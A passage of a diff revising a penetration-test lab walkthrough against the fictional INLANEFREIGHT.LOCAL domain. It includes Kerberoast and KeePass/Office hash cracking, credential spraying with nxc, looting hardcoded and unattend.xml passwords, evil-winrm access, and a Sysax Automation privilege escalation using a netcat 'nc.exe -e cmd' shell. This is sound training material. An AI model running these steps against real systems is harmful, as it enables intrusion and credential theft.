0818854e86394273899cc84db7d327266dd89b30dc87d08bc7feea235ee529e3929f89a1608b3a9f62181a073ca2c1ece3057186d8a59f83fd61c086dfa500f3d924a48db4c23ddf433797eb1ade50df835298bfbed56109830b0c13886279b70aa8dc651303f0c4d30bf474bc331e37d2e75a1e0e77fb2ace7ee99042de9edd61d9b93d4153c6bb54318fbafab198a81a110f5ff6a4fa8b911be234471ab86884de54325c8974e2e779e15cc5ec994b084d12149d507e9b315bd0d4e7715cafe380d11d360331ecd26c88511773c9b339:lucky7
-
- ```
+```bash
+hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
+```
 
 ```
-nxc smb 172.16.8.3 -u backupjob -p lucky7       
+$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/backupjob*$...:lucky7
+```
+
+bash
+
+```bash
+nxc smb 172.16.8.3 -u backupjob -p lucky7
+```
+
+```
 SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\backupjob:lucky7 
-                                                                                              
+SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\backupjob:lucky7
 ```
 
-useless account (see if if its worth keeping)
+This account grants no further access and is not pursued.
 
-ssmalls is member of IT admin groups, enumerating shares again as this user reveals a powershell script under the IT share:
+---
+
+## SMB Share Enumeration — IT Department Shares
+
+`ssmalls` is a member of an IT admin group, so the shares are enumerated again with this account:
+
+bash
 
 ```bash
 smbmap -u ssmalls -p Password123! -H 172.16.8.3 -r 'Department Shares' --depth 5
+```
 
-    ________  ___      ___  _______   ___      ___       __         _______
-   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
-  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
-   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
-    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
-   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
-  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
------------------------------------------------------------------------------
-SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
-                     https://github.com/ShawnDEvans/smbmap
-
-[*] Detected 1 hosts serving SMB                                                                                                  
-[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
-                                                                                                                             
+```
 [+] IP: 172.16.8.3:445  Name: DC01.INLANEFREIGHT.LOCAL  Status: Authenticated
         Disk                                                    Permissions     Comment
-        ----                                                    -----------     -------
-        ADMIN$                                                  NO ACCESS       Remote Admin
-        C$                                                      NO ACCESS       Default share
         Department Shares                                       READ ONLY       Share for department users
         ./Department Shares
-        dr--r--r--                0 Wed Jun  1 14:34:56 2022    .
-        dr--r--r--                0 Wed Jun  1 14:34:56 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:36:07 2022    Accounting
+        dr--r--r--                0 Wed Jun  1 14:34:56 2022    Accounting
         dr--r--r--                0 Wed Jun  1 14:36:00 2022    Executives
         dr--r--r--                0 Wed Jun  1 14:35:53 2022    Finance
         dr--r--r--                0 Wed Jun  1 14:35:29 2022    HR
         dr--r--r--                0 Wed Jun  1 14:35:14 2022    IT
         dr--r--r--                0 Wed Jun  1 14:35:45 2022    Marketing
         dr--r--r--                0 Wed Jun  1 14:35:37 2022    R&D
-        ./Department Shares//Accounting
-        dr--r--r--                0 Wed Jun  1 14:36:07 2022    .
-        dr--r--r--                0 Wed Jun  1 14:36:07 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:36:12 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:36:10 2022    Public
-        ./Department Shares//Executives
-        dr--r--r--                0 Wed Jun  1 14:36:00 2022    .
-        dr--r--r--                0 Wed Jun  1 14:36:00 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:36:05 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:36:02 2022    Public
-        ./Department Shares//Finance
-        dr--r--r--                0 Wed Jun  1 14:35:53 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:53 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:35:57 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:35:55 2022    Public
-        ./Department Shares//HR
-        dr--r--r--                0 Wed Jun  1 14:35:29 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:29 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:35:32 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:35:34 2022    Public
-        ./Department Shares//IT
-        dr--r--r--                0 Wed Jun  1 14:35:14 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:14 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:35:16 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:35:14 2022    Public
         ./Department Shares//IT/Private
-        dr--r--r--                0 Wed Jun  1 14:35:16 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:16 2022    ..
         dr--r--r--                0 Wed Jun  1 14:35:16 2022    Development
         ./Department Shares//IT/Private/Development
-        dr--r--r--                0 Wed Jun  1 14:35:16 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:16 2022    ..
         fr--r--r--             4001 Wed Jun  1 14:35:16 2022    SQL Express Backup.ps1
-        ./Department Shares//Marketing
-        dr--r--r--                0 Wed Jun  1 14:35:45 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:45 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:35:50 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:35:48 2022    Public
-        ./Department Shares//R&D
-        dr--r--r--                0 Wed Jun  1 14:35:37 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:37 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:35:43 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:35:40 2022    Public
-        IPC$                                                    READ ONLY       Remote IPC
-        NETLOGON                                                READ ONLY       Logon server share 
-        SYSVOL                                                  READ ONLY       Logon server share 
-[*] Closed 1 connections                                                                             
 ```
 
-Downloading and readint the script:
+bash
 
 ```bash
 smbclient -U ssmalls "//172.16.8.3/Department Shares" --password='Password123!'
-
-Try "help" to get a list of possible commands.
-smb: \> cd IT
-smb: \IT\> ls
-  .                                   D        0  Wed Jun  1 14:33:42 2022
-  ..                                  D        0  Wed Jun  1 14:33:42 2022
-  Private                             D        0  Wed Jun  1 14:33:44 2022
-  Public                              D        0  Wed Jun  1 14:33:41 2022
-
-                10328063 blocks of size 4096. 8187746 blocks available
-smb: \IT\> cd Privaye
-cd \IT\Privaye\: NT_STATUS_OBJECT_NAME_NOT_FOUND
-smb: \IT\> cd Privaye
-cd \IT\Privaye\: NT_STATUS_OBJECT_NAME_NOT_FOUND
-smb: \IT\> cd Private
-smb: \IT\Private\> ls
-  .                                   D        0  Wed Jun  1 14:33:44 2022
-  ..                                  D        0  Wed Jun  1 14:33:44 2022
-  Development                         D        0  Wed Jun  1 14:34:17 2022
-
-                10328063 blocks of size 4096. 8187746 blocks available
-smb: \IT\Private\> cd Development
-smb: \IT\Private\Development\> ls
-  .                                   D        0  Wed Jun  1 14:34:17 2022
-  ..                                  D        0  Wed Jun  1 14:34:17 2022
-  SQL Express Backup.ps1              A     4001  Wed Jun  1 14:34:15 2022
-
-                10328063 blocks of size 4096. 8187746 blocks available
-smb: \IT\Private\Development\> get "SQL Express Backup.ps1"
-getting file \IT\Private\Development\SQL Express Backup.ps1 of size 4001 as SQL Express Backup.ps1 (23.3 KiloBytes/sec) (average 23.3 KiloBytes/sec)
-smb: \IT\Private\Development\> 
-
 ```
 
-```bash
-cat 'SQL Express Backup.ps1'
-$serverName = ".\SQLExpress"
-$backupDirectory = "D:\backupSQL"
-$daysToStoreDailyBackups = 7
-$daysToStoreWeeklyBackups = 28
-$monthsToStoreMonthlyBackups = 3
+```
+smb: \> cd IT\Private\Development
+smb: \IT\Private\Development\> get "SQL Express Backup.ps1"
+getting file \IT\Private\Development\SQL Express Backup.ps1 of size 4001 as SQL Express Backup.ps1 (23.3 KiloBytes/sec) (average 23.3 KiloBytes/sec)
+```
 
-[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SMO") | Out-Null
-[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoExtended") | Out-Null
-[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo") | Out-Null
-[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum") | Out-Null
- 
+The script contains hardcoded SQL credentials for a `backupadm` account:
+
+powershell
+
+```powershell
+$serverName = ".\SQLExpress"
 $mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
 $mySrvConn.ServerInstance=$serverName
 $mySrvConn.LoginSecure = $false
 $mySrvConn.Login = "backupadm"
 $mySrvConn.Password = "!qazXSW@"
-
-$server = new-object Microsoft.SqlServer.Management.SMO.Server($mySrvConn)
-
-$dbs = $server.Databases
-$startDate = (Get-Date)
-"$startDate"
-
-Get-ChildItem "$backupDirectory\*_daily.bak" |? { $_.lastwritetime -le (Get-Date).AddDays(-$daysToStoreDailyBackups)} |% {Remove-Item $_ -force }
-"removed all previous daily backups older than $daysToStoreDailyBackups days"
-
-foreach ($database in $dbs | where { $_.IsSystemObject -eq $False})
-{
-    $dbName = $database.Name      
-
-    $timestamp = Get-Date -format yyyy-MM-dd-HHmmss
-    $targetPath = $backupDirectory + "\" + $dbName + "_" + $timestamp + "_daily.bak"
-
-    $smoBackup = New-Object ("Microsoft.SqlServer.Management.Smo.Backup")
-    $smoBackup.Action = "Database"
-    $smoBackup.BackupSetDescription = "Full Backup of " + $dbName
-    $smoBackup.BackupSetName = $dbName + " Backup"
-    $smoBackup.Database = $dbName
-    $smoBackup.MediaDescription = "Disk"
-    $smoBackup.Devices.AddDevice($targetPath, "File")
-    $smoBackup.SqlBackup($server) 
-    "backed up $dbName ($serverName) to $targetPath"               
-}
-
-if([Int] (Get-Date).DayOfWeek -eq 0)
-{
-    Get-ChildItem "$backupDirectory\*_weekly.bak" |? { $_.lastwritetime -le (Get-Date).AddDays(-$daysToStoreWeeklyBackups)} |% {Remove-Item $_ -force }
-    "removed all previous daily backups older than $daysToStoreWeeklyBackups days"
-
-    foreach ($database in $dbs | where { $_.IsSystemObject -eq $False})
-    {
-        $dbName = $database.Name      
-
-        $timestamp = Get-Date -format yyyy-MM-dd-HHmmss
-        $targetPath = $backupDirectory + "\" + $dbName + "_" + $timestamp + "_weekly.bak"
-
-        $smoBackup = New-Object ("Microsoft.SqlServer.Management.Smo.Backup")
-        $smoBackup.Action = "Database"
-        $smoBackup.BackupSetDescription = "Full Backup of " + $dbName
-        $smoBackup.BackupSetName = $dbName + " Backup"
-        $smoBackup.Database = $dbName
-        $smoBackup.MediaDescription = "Disk"
-        $smoBackup.Devices.AddDevice($targetPath, "File")
-        $smoBackup.SqlBackup($server) 
-        "backed up $dbName ($serverName) to $targetPath"                 
-    }
-}
-
-if([Int] (Get-Date).Day -eq 1)
-{
-    Get-ChildItem "$backupDirectory\*_monthly.bak" |? { $_.lastwritetime -le (Get-Date).AddMonths(-$monthsToStoreMonthlyBackups)} |% {Remove-Item $_ -force }
-    "removed all previous monthly backups older than $monthsToStoreMonthlyBackups days"
-
-    foreach ($database in $dbs | where { $_.IsSystemObject -eq $False})
-    {
-        $dbName = $database.Name      
-
-        $timestamp = Get-Date -format yyyy-MM-dd-HHmmss
-        $targetPath = $backupDirectory + "\" + $dbName + "_" + $timestamp + "_monthly.bak"
-
-        $smoBackup = New-Object ("Microsoft.SqlServer.Management.Smo.Backup")
-        $smoBackup.Action = "Database"
-        $smoBackup.BackupSetDescription = "Full Backup of " + $dbName
-        $smoBackup.BackupSetName = $dbName + " Backup"
-        $smoBackup.Database = $dbName
-        $smoBackup.MediaDescription = "Disk"
-        $smoBackup.Devices.AddDevice($targetPath, "File")
-        $smoBackup.SqlBackup($server) 
-        "backed up $dbName ($serverName) to $targetPath"                 
-    }
-}                                                                                                                                                                                                                                    
-
 ```
 
-```
-nxc smb 172.16.8.3 -u backupadm -p '!qazXSW@'         
-SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@
-
-```
-
-Account creds work con MS01 for winrm access:
+bash
 
 ```bash
- nxc winrm 172.16.8.0/24 -u backupadm -p '!qazXSW@'
-WINRM       172.16.8.3      5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) 
-WINRM       172.16.8.20     5985   ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL) 
-WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL) 
+nxc smb 172.16.8.3 -u backupadm -p '!qazXSW@'
+```
+
+```
+SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@
+```
+
+---
+
+## MS01 (172.16.8.50) — WinRM Access as backupadm
+
+The recovered credentials are valid for WinRM across the domain, including `ACADEMY-AEN-MS0`:
+
+bash
+
+```bash
+nxc winrm 172.16.8.0/24 -u backupadm -p '!qazXSW@'
+```
+
+```
+WINRM       172.16.8.3      5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL)
+WINRM       172.16.8.20     5985   ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL)
+WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL)
 WINRM       172.16.8.3      5985   DC01             [-] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@
 WINRM       172.16.8.20     5985   ACADEMY-AEN-DEV  [-] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@
 WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@ (Pwn3d!)
-
 ```
+
+bash
 
 ```bash
- evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
+evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
 ```
 
-Searching in the c:\ directory discloses a directory and two files:
+`C:\` contains two files of interest:
 
- ```bash
- *Evil-WinRM* PS C:\Users\backupadm\Desktop> cd c:\
+```
 *Evil-WinRM* PS C:\> ls
-
-
     Directory: C:\
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
 d-----         6/1/2022   2:17 PM                panther
-d-----        2/25/2022  10:20 AM                PerfLogs
-d-r---        6/22/2022  11:47 PM                Program Files
-d-----         6/1/2022   2:23 PM                Program Files (x86)
 d-r---       11/14/2026  11:54 AM                Users
-d-----        6/23/2022  12:07 AM                Windows
 -a----         6/1/2022   2:17 PM         186880 budget_data.xlsx
 -a----         6/1/2022   2:21 PM           2190 Inlanefreight.kdbx
+```
 
-
+```
 *Evil-WinRM* PS C:\> cd panther
 *Evil-WinRM* PS C:\panther> ls
-
-
     Directory: C:\panther
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
 -a----         6/1/2022   2:17 PM           6995 unattend.xml
-
- ```
-
-Found creds:
-
-```
-<?xml version="1.0" encoding="utf-8"?>
-<unattend xmlns="urn:schemas-microsoft-com:unattend">
-    <settings pass="oobeSystem">
-        <component name="Microsoft-Windows-International-Core" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-            <InputLocale>de-de</InputLocale>
-            <SystemLocale>de-de</SystemLocale>
-            <UILanguage>de-de</UILanguage>
-            <UILanguageFallback>de-de</UILanguageFallback>
-            <UserLocale>de-de</UserLocale>
-        </component>
-        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-            <OOBE>
-                <HideEULAPage>true</HideEULAPage>
-                <HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>
-                <NetworkLocation>Work</NetworkLocation>
-                <ProtectYourPC>1</ProtectYourPC>
-            </OOBE>
-            <AutoLogon>
-                <Password>
-                    <Value>Sys26Admin</Value>
-                    <PlainText>true</PlainText>
-                </Password>
-                <Enabled>true</Enabled>
-                <LogonCount>1</LogonCount>
-                <Username>ilfserveradm</Username>
-            </AutoLogon>
-            <FirstLogonCommands>
-                <SynchronousCommand wcm:action="add">
-                    <CommandLine>C:\Windows\system32\net.exe user "Standard" /logonpasswordchg:yes</CommandLine>
-                    <Description>Force Password Reset for Standard account</Description>
-                    <Order>1</Order>
-                    <RequiresUserInput>false</RequiresUserInput>
-                </SynchronousCommand>
-                <SynchronousCommand wcm:action="add">
-                    <CommandLine>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoLogonSID /d "" /f</CommandLine>
-                    <Description>Clear Autologon SID</Description>
-                    <Order>2</Order>
-                    <RequiresUserInput>false</RequiresUserInput>
-                </SynchronousCommand>
-                <SynchronousCommand wcm:action="add">
-                    <CommandLine>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /d "Standard" /f</CommandLine>
-                    <Description>Select Standard account</Description>
-                    <Order>3</Order>
-                    <RequiresUserInput>false</RequiresUserInput>
-                </SynchronousCommand>
-                <SynchronousCommand wcm:action="add">
-                    <CommandLine>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v ForceUnlockLogon /d 0 /f /t REG_DWORD</CommandLine>
-                    <Description>Clear unlock</Description>
-                    <Order>4</Order>
-                    <RequiresUserInput>false</RequiresUserInput>
-                </SynchronousCommand>
-                <SynchronousCommand wcm:action="add">
-                    <CommandLine>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v ForceAutoLogon /d 0 /f /t REG_DWORD</CommandLine>
-                    <Description>Clear autologon</Description>
-                    <Order>5</Order>
-                    <RequiresUserInput>false</RequiresUserInput>
-                </SynchronousCommand>
-                <SynchronousCommand wcm:action="add">
-                    <CommandLine>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v IsConnectedAutoLogon /d 0 /f /t REG_DWORD</CommandLine>
-                    <Description>Clear isconnected</Description>
-                    <Order>6</Order>
-                    <RequiresUserInput>false</RequiresUserInput>
-                </SynchronousCommand>
-                <SynchronousCommand wcm:action="add">
-                    <CommandLine>reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 0 /f</CommandLine>
-                    <Description>Disable Autologon</Description>
-                    <Order>7</Order>
-                    <RequiresUserInput>false</RequiresUserInput>
-                </SynchronousCommand>
-                <SynchronousCommand wcm:action="add">
-                    <CommandLine>reg delete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /f</CommandLine>
-                    <Description>Remove Autologon password</Description>
-                    <Order>8</Order>
-                    <RequiresUserInput>false</RequiresUserInput>
-                </SynchronousCommand>
-                <SynchronousCommand wcm:action="add">
-                    <CommandLine>shutdown /r /t 180</CommandLine>
-                    <Description>Restart computer after 180 seconds</Description>
-                    <Order>9</Order>
-                    <RequiresUserInput>false</RequiresUserInput>
-                </SynchronousCommand>
-            </FirstLogonCommands>
-            <UserAccounts>
-                <LocalAccounts>
-                    <LocalAccount wcm:action="add">
-                        <Password>
-                            <Value>Sys26Admin</Value>
-                            <PlainText>true</PlainText>
-                        </Password>
-                        <Description />
-                        <DisplayName />
-                        <Group>User</Group>
-                        <Name>ilfserveradm</Name>
-                    </LocalAccount>
-                </LocalAccounts>
-            </UserAccounts>
-            <TimeZone>W. Europe Standard Time</TimeZone>
-        </component>
-    </settings>
-    <settings pass="generalize">
-        <component name="Microsoft-Windows-PnpSysprep" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-            <DoNotCleanUpNonPresentDevices>true</DoNotCleanUpNonPresentDevices>
-            <PersistAllDeviceInstalls>true</PersistAllDeviceInstalls>
-        </component>
-    </settings>
-    <settings pass="specialize">
-        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-            <CopyProfile>true</CopyProfile>
-        </component>
-    </settings>
-</unattend>
-
 ```
 
-ilfserveradm:Sys26Admin
+---
 
-Downloading the files:
+## Credential Harvesting on MS01 — KeePass & Excel
 
-```
-*Evil-WinRM* PS C:\> download budget_data.xlsx
-                                        
-Info: Downloading C:\\budget_data.xlsx to budget_data.xlsx
-                                        
-Info: Download successful!
-*Evil-WinRM* PS C:\> download Inlanefreight.kdbx
-                                        
-Info: Downloading C:\\Inlanefreight.kdbx to Inlanefreight.kdbx
-                                        
-Info: Download successful!
-*Evil-WinRM* PS C:\> 
+Both files are downloaded and converted into crackable hash formats:
 
-```
-
-Converting into crackable format and cracking both:
-
-```
-keepass2john Inlanefreight.kdbx > Inlanefreight.hash
-                                                                                                                                                                                                                                    
-┌──(kali㉿kali)-[~/labs/aen]
-└─$ john Inlanefreight.hash --wordlist=/usr/share/wordlists/rockyou.txt
-Using default input encoding: UTF-8
-Loaded 1 password hash (KeePass [SHA256 AES 32/64])
-Cost 1 (iteration count) is 60000 for all loaded hashes
-Cost 2 (version) is 2 for all loaded hashes
-Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-Welcome1         (Inlanefreight)     
-1g 0:00:02:20 DONE (2026-11-14 13:05) 0.007139g/s 288.4p/s 288.4c/s 288.4C/s alfiemoon..Thomas1
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed. 
-
-```
-
-```
-file budget_data.xlsx                   
-budget_data.xlsx: CDFV2 Encrypted
-                                                                                                                
-┌──(kali㉿kali)-[~/labs/aen]
-└─$ office2john budget_data.xlsx > budget_data.hash  
-                                                                                                                
-┌──(kali㉿kali)-[~/labs/aen]
-└─$ john budget_data.hash --wordlist=/usr/share/wordlists/rockyou.txt  
-Using default input encoding: UTF-8
-Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
-Cost 1 (MS Office version) is 2013 for all loaded hashes
-Cost 2 (iteration count) is 100000 for all loaded hashes
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-lucky7           (budget_data.xlsx)     
-1g 0:00:00:01 DONE (2026-11-14 13:27) 0.5050g/s 436.3p/s 436.3c/s 436.3C/s michelle1..felipe
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed. 
-
-```
-
-budget_data.xlsx
-
-![](./ms01/1.png)
-
-Inlanefreight.kdbx
-
-![](./ms01/2.png)
-
-However both are useless.
-## RDP access
-
-Searching for information about this user reveals that he is memeber of the RDP group:
-
-```
-*Evil-WinRM* PS C:\Users\backupadm\Documents> net user ilfserveradm
-User name                    ilfserveradm
-Full Name                    ilfserveradm
-Comment
-User's comment
-Country/region code          000 (System Default)
-Account active               Yes
-Account expires              Never
-
-Password last set            6/1/2022 1:17:17 PM
-Password expires             Never
-Password changeable          6/1/2022 1:17:17 PM
-Password required            Yes
-User may change password     Yes
-
-Workstations allowed         All
-Logon script
-User profile
-Home directory
-Last logon                   6/1/2022 1:17:17 PM
-
-Logon hours allowed          All
-
-Local Group Memberships      *Remote Desktop Users
-Global Group memberships     *None
-The command completed successfully.
-
-
-```
-
-Accessing rdp:
+bash
 
 ```bash
-xfreerdp3 /u:ilfrserveradm /p:Sys26Admin /v:172.16.8.50 /drive:share,/home/kali/tools
+*Evil-WinRM* PS C:\> download budget_data.xlsx
+*Evil-WinRM* PS C:\> download Inlanefreight.kdbx
 ```
 
-Searching into program directories (Program files x86) reveals sysaxautomation
+bash
 
-![](./ms01/3.png)
+```bash
+keepass2john Inlanefreight.kdbx > Inlanefreight.hash
+john Inlanefreight.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
-searching sysaxautomation privesc
+```
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Welcome1         (Inlanefreight)
+1g 0:00:02:20 DONE (2026-11-14 13:05) 0.007139g/s 288.4p/s
+```
 
-https://www.exploit-db.com/exploits/50834
+bash
 
-```txt
+```bash
+file budget_data.xlsx
+```
+
+```
+budget_data.xlsx: CDFV2 Encrypted
+```
+
+bash
+
+```bash
+office2john budget_data.xlsx > budget_data.hash
+john budget_data.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+```
+Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
+lucky7           (budget_data.xlsx)
+1g 0:00:00:01 DONE (2026-11-14 13:27) 0.5050g/s 436.3p/s
+```
+
+Opening both files confirms their content, but neither discloses anything useful for further access:
+
+./ms01/1.png
+
+./ms01/2.png
+
+---
+
+## RDP Access as ilfserveradm
+
+The `unattend.xml` file found under `C:\panther` discloses local credentials for `ilfserveradm`:
+
+xml
+
+```xml
+<AutoLogon>
+    <Password><Value>Sys26Admin</Value><PlainText>true</PlainText></Password>
+    <Enabled>true</Enabled>
+    <Username>ilfserveradm</Username>
+</AutoLogon>
+...
+<LocalAccount wcm:action="add">
+    <Password><Value>Sys26Admin</Value><PlainText>true</PlainText></Password>
+    <Group>User</Group>
+    <Name>ilfserveradm</Name>
+</LocalAccount>
+```
+
+`ilfserveradm:Sys26Admin` is confirmed to be a member of **Remote Desktop Users**:
+
+bash
+
+```bash
+*Evil-WinRM* PS C:\Users\backupadm\Documents> net user ilfserveradm
+```
+
+```
+User name                    ilfserveradm
+Account active               Yes
+Password last set            6/1/2022 1:17:17 PM
+Password expires             Never
+Local Group Memberships      *Remote Desktop Users
+Global Group memberships     *None
+```
+
+bash
+
+```bash
+xfreerdp3 /u:ilfserveradm /p:Sys26Admin /v:172.16.8.50 /drive:share,/home/kali/tools
+```
+
+---
+
+## Privilege Escalation on MS01 — Sysax Automation
+
+`Program Files (x86)` contains a Sysax Automation installation:
+
+./ms01/3.png
+
+The product is vulnerable to local privilege escalation through its triggered-task feature ([PoC reference](https://www.exploit-db.com/exploits/50834)):
+
+```
 1. Create folder c:\temp
 2. Download netcat (nc.exe) to c:\temp
-3. Create file 'pwn.bat' in c:\temp with contents
-	c:\temp\nc.exe localhost 1337 -e cmd
-4. Open command prompt and netcat listener
-	nc -nlvvp 1337
+3. Create file 'pwn.bat' in c:\temp with contents:
+     c:\temp\nc.exe localhost 1337 -e cmd
+4. Open command prompt and netcat listener: nc -nlvvp 1337
 5. Open sysaxschedscp.exe from C:\Program Files (x86)\SysaxAutomation
-6. Select Setup Scheduled/Triggered Tasks
-	- Add task (Triggered)
-	- Update folder to monitor to be c:\temp
-	- Check 'Run task if a file is added to the monitor folder or subfolder(s)'
-	- Choose 'Run any other Program' and choose c:\temp\pwn.bat
-	- Uncheck 'Login as the following user to run task'
-	- Finish and Save
+6. Select Setup Scheduled/Triggered Tasks:
+     - Add task (Triggered)
+     - Update folder to monitor to be c:\temp
+     - Check 'Run task if a file is added to the monitor folder or subfolder(s)'
+     - Choose 'Run any other Program' and choose c:\temp\pwn.bat
+     - Uncheck 'Login as the following user to run task'
+     - Finish and Save
 7. Create new text file in c:\temp
-8. Check netcat listener
-	C:\WINDOWS\system32>whoami
-	whoami
-	nt authority\system
+8. Check netcat listener -> nt authority\system
 ```
 
-Following the steps:
+`pwn.bat` is written to the Desktop, pointing to a local netcat listener:
 
+./ms01/4.png
 
-![](./ms01/4.png)
+A triggered task is configured in `sysaxschedscp.exe`:
 
-![](./ms01/5.png)
+./ms01/5.png
 
-![](./ms01/6.png)
+The task monitors the Desktop folder and fires when a file is added to it:
 
-![](./ms01/7.png)
+./ms01/6.png
 
-![](./ms01/8.png)
+It is set to run `pwn.bat` as "any other program", with the "Login as the following user" option left unchecked, so it runs in the scheduler service's own privileged context:
 
-![](./ms01/9.png)
+./ms01/7.png
+
+./ms01/8.png
+
